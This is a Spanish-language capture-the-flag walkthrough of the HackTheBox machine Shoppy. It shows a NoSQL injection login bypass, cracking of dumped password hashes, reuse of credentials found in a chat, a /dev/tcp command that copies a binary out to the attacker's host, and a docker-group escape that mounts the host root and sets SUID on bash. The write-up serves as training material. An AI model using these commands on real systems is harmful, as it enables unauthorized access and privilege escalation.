# 10.10.11.180 - Shoppy
![Shoppy](https://user-images.githubusercontent.com/96772264/214269366-d3d5cd68-b466-42c7-9e32-1eaaadffbcef.png)
-----------------------
# Part 1: Enumeración

Puertos abiertos 22, 80(http) y 9093:
En cuanto ponemos la IP sale http://shoppy.htb/ pero al no resolver el dominio da error, se soluciona poniendolo en el /etc/hosts.
```console
└─$ whatweb http://shoppy.htb    
HTML5, HTTPServer[nginx/1.23.1], JQuery
```
La web nos presenta una cuenta atras. 
![shoppy1](https://user-images.githubusercontent.com/96772264/214270005-ac9efc26-1da7-4891-9e7c-a1401cfedc08.PNG)

Si fuzeamos...
```console
└─$ wfuzz -t 200 --hc=404 --hl=7 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ/
000000039:   200        25 L     62 W       1074 Ch     "login"
000000245:   302        0 L      4 W        28 Ch       "admin"
```
El codigo de error 404 es un "cannot /GET", el tipico de nginx.
Otra cosa de nginx esque funciona con javascript, asi que no fuzzearemos por extensiones php.

-----------------------
# Part 2: Nosqli

En /login nos encontramos un panel de registro. No tenemos credenciales asi que habra que tirar de inyecciones.
![shoppy2](https://user-images.githubusercontent.com/96772264/214270044-6f6d1612-a157-447b-b95b-2fce94a43aad.PNG)

```console
└─$ curl -s -X POST http://shoppy.htb/login -d "username=test&password=test"
Found. Redirecting to /login?error=WrongCredentials
```
Nginx suele usar nosqli, pero si intentamos una inyeccion se nos queda pillado:
```console
└─$ curl -s -X POST http://shoppy.htb/login -d "username=admin&password[$ne]=test"
└─$ curl -s -X POST http://shoppy.htb/login -H "Content-Type: application/json" \
-d $'{"username":"admin","password":{"$ne":""}}' -L
```
Ninguna funciona, otra inyeccion nosqli seria ```admin'||'1'=='1"``` equivalente a ```admin' or 1=1-- -``` del sql
Con esa ultima entramos al panel de administracion.
![shoppy3](https://user-images.githubusercontent.com/96772264/214270058-6bd78c48-e0f3-458a-9ec3-1bdbd9d4eeb9.PNG)

Hay un boton de "search for users", como no sabemos si hay mas gente a parte de admin repetimos la query ```admin'||'1'=='1"```, 
dandonos un boton de ver reporte:
```
{"_id": "62db0e93d6d6a999a66ee67a",
 "username": "admin",
 "password": "23c6877d9e2b564ef8b32c3a23de27b2"},
{"_id": "62db0e93d6d6a999a66ee67b",
 "username": "josh",
 "password": "6ebcea65320589ca4f2f1ce039975995"}
```
En crackstation nos crakean el 6e... como "remembermethisway"
Pero no nos sirve para ssh ```sshpass -p "remembermethisway" ssh josh@10.10.11.180```

-----------------------
# Part 3: Fuzzing y leak de creds

Si hacemos un fuzzing de subdominios con el diccionario clasico ```/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt```
No ncontramos nada en cambio este:
```console
└─$ wfuzz -c --hl=7 -w $(locate bitquark-subdomains-top100000.txt) -H "Host: FUZZ.shoppy.htb" -u http://shoppy.htb/ -t 100
000047340:   200        0 L      141 W      3122 Ch     "mattermost"
```

mattermost.shoppy.htb nos presenta un panel de login. Entramos con las creds josh:rememberthisway
Es un chat, encontramos el mensaje en el canal "Development":
![shoppy4](https://user-images.githubusercontent.com/96772264/214270072-336bec7d-9478-483f-969d-3a7487afc0a0.PNG)

```console
Ey @jaeger, cuando estaba intentado instalar docket en la maquina empece a aprender C++ e hice un gestor de contraseñas.
Lo puedes testear si quieres, esta en la maquina 
```
En el canal "coffe-break" sale una tal jess enseñando a su gato Tigrou
En "deply-machine" nos dan las creds jaeger:Sh0ppyBest@pp!
```console
└─$ sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@10.10.11.180 
```

-----------------------
# Part 4: leak de credenciales en binario

En el directorio /home de deply está ese script de C++ "password-manager.cpp"

Si enumeramos el sistema con mi script, acabamos con el resultado de ```sudo -l```
```(deploy) /home/deploy/password-manager```
```console
jaeger@shoppy:/tmp$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sh0ppyBest@pp!
Access denied! This incident will be reported !
```
Como ltrace y strace no existen, tiramos de strings:
```console
jaeger@shoppy:/tmp$ strings /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password:
Access granted! Here is creds !
cat /home/deploy/creds.txt
Access denied! This incident will be reported !

jaeger@shoppy:/tmp$ cat < /home/deploy/password-manager > /dev/tcp/10.10.14.14/666

Si recibimos el binario:
```console
└─$ sudo nc -nlvp 666 > password-manager
└─$ chmod +x password-manager
```
Abrimos el binario con ltrace y strace, no hallamos nada interesante, en cambio si intentamos leer
el codigo ensamblador con radare2

```
└─$ r2 password-manager
[0x00001120]> aaa
[0x00001120]> afl
[0x00001120]> s main
[0x00001205]> pdf
# Lineas mas adelante leemos:
0x0000129b      488d35bb0d00.  lea rsi, str.Sample         ; 0x205d ; u"Sample
```
Esto tambien se puede ver con strings si cabmiamos el encoding a little endian:
```
└─$ strings -e l password-manager
Sample
```
```console
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```
-----------------------
# Part 5: explotando docker

Nuestro usaurio deply forma parte del grupo "docker" (comando ```id```)
```console
deploy@shoppy:/tmp$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   6 months ago   5.53MB
deploy@shoppy:/tmp$ docker run -it -v /:/mnt/root --name cucuxii alpine
/ # cd mnt
/mnt # ls
root
/mnt/root # ls
# Todo el sistema madre
/mnt/root/usr/bin # chmod u+s /mnt/root/usr/bin/bash
mnt/root/usr/bin # exit
deploy@shoppy:/tmp$ bash -p
bash-5.1# whoami
root
```


